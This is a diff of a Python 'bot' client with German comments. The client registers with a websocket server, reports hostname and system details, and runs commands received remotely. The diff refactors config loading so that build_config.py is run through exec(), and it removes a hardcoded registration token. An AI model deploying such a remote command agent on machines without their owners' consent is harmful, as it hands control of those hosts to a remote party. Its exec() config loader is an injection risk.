@@ -21,29 +21,33 @@ MAX_COMMAND_TIMEOUT = int(os.getenv("MAX_COMMAND_TIMEOUT", "60"))
 
 # ====================== KONFIGURATION LADEN ======================
 def _load_build_config():
-    """Importiert die vom Build-Skript erzeugte build_config.py."""
+    """Liest die build_config.py und gibt ein dict mit SERVER_URL und REGISTRATION_TOKEN zurück."""
     try:
         if getattr(sys, 'frozen', False):
-            sys.path.insert(0, sys._MEIPASS)
-        import build_config
-        return {
-            "server_url": build_config.SERVER_URL,
-            "registration_token": build_config.REGISTRATION_TOKEN,
-        }
-    except ImportError:
-        return None
+            base = sys._MEIPASS
+        else:
+            base = os.path.dirname(os.path.abspath(__file__))
+
+        config_path = os.path.join(base, "build_config.py")
+        if os.path.isfile(config_path):
+            config_vars = {}
+            with open(config_path, "r", encoding="utf-8") as f:
+                exec(f.read(), config_vars)
+            return config_vars
+    except Exception:
+        pass
+    return None
 
 build_cfg = _load_build_config()
 
-# --- Server-URL konfigurieren ---
+# --- SERVER_URL ---
 SERVER_URL = os.getenv("SERVER_URL")
+if not SERVER_URL and build_cfg:
+    SERVER_URL = build_cfg.get("SERVER_URL")
 if not SERVER_URL:
-    if build_cfg:
-        SERVER_URL = build_cfg["server_url"]
-    else:
-        SERVER_URL = "ws://localhost:8080/ws"
+    SERVER_URL = "ws://localhost:8080/ws"   # absoluter Fallback
 
-# --- SSL-Kontext ---
+# --- SSL-Kontext (wss) ---
 if SERVER_URL.startswith("wss://"):
     import ssl
     ssl_context = ssl.create_default_context()
@@ -52,28 +56,38 @@ if SERVER_URL.startswith("wss://"):
 else:
     ssl_context = None
 
-# --- Token ---
-if build_cfg:
-    REGISTRATION_TOKEN = build_cfg["registration_token"]
-else:
-    REGISTRATION_TOKEN = os.getenv("REGISTRATION_TOKEN", "4a371b47dffe9807dccb004975b28fa686003ff73f7bd868")
+# --- REGISTRATION_TOKEN ---
+REGISTRATION_TOKEN = os.getenv("REGISTRATION_TOKEN")
+if not REGISTRATION_TOKEN and build_cfg:
+    REGISTRATION_TOKEN = build_cfg.get("REGISTRATION_TOKEN")
+
+# Kein hartkodierter Fallback – später klare Fehlermeldung, wenn nötig
+if not REGISTRATION_TOKEN:
+    REGISTRATION_TOKEN = None
+
 
 def load_existing_config():
+    """Lädt gespeicherte Bot-ID/Secret aus Datei oder Umgebung. Gibt dict oder None zurück."""
     if CONFIG_FILE.exists():
         try:
             with open(CONFIG_FILE) as f:
                 data = json.load(f)
-            if data.get("bot_id") and data.get("bot_secret"):
-                return data["bot_id"], data["bot_secret"]
+            bot_id = data.get("bot_id")
+            bot_secret = data.get("bot_secret")
+            if bot_id and bot_secret:
+                return {"bot_id": bot_id, "bot_secret": bot_secret}
         except Exception:
             pass
+    # Fallback Umgebungsvariablen
     env_id = os.getenv("BOT_ID")
     env_secret = os.getenv("BOT_SECRET")
     if env_id and env_secret:
-        return env_id, env_secret
-    return None, None
+        return {"bot_id": env_id, "bot_secret": env_secret}
+    return None
+
 
 async def register_bot(bot_id, server_url, reg_token):
+    """Registriert einen neuen Bot beim Server."""
     try:
         async with websockets.connect(server_url, ssl=ssl_context) as ws:
             await ws.send(json.dumps({
@@ -89,6 +103,7 @@ async def register_bot(bot_id, server_url, reg_token):
         logger.error(f"Registrierungsfehler: {e}")
     return None
 
+
 async def get_system_info():
     return {
         "hostname": platform.node(),
@@ -101,6 +116,7 @@ async def get_system_info():
         "bot_id": BOT_ID,
         "pid": os.getpid()
     }
+
 
 async def execute_command(cmd: str, timeout=MAX_COMMAND_TIMEOUT):
     try:
@@ -124,15 +140,21 @@ async def execute_command(cmd: str, timeout=MAX_COMMAND_TIMEOUT):
     except Exception as e:
         return {"success": False, "error": str(e)}
 
+
 async def main():
     global BOT_ID, BOT_SECRET
+
+    # 1. Vorhandene Konfiguration prüfen
     existing = load_existing_config()
     if existing:
-        BOT_ID, BOT_SECRET = existing
+        BOT_ID = existing["bot_id"]
+        BOT_SECRET = existing["bot_secret"]
     else:
+        # 2. Keine Konfiguration → Registrierung nötig
         if not REGISTRATION_TOKEN:
             print("❌ Bot konnte nicht gestartet werden. Kein REGISTRATION_TOKEN und keine lokale Konfiguration.")
             sys.exit(1)
+
         BOT_ID = f"{socket.gethostname()}-{str(uuid.uuid4())[:8]}"
         result = await register_bot(BOT_ID, SERVER_URL, REGISTRATION_TOKEN)
         if result:
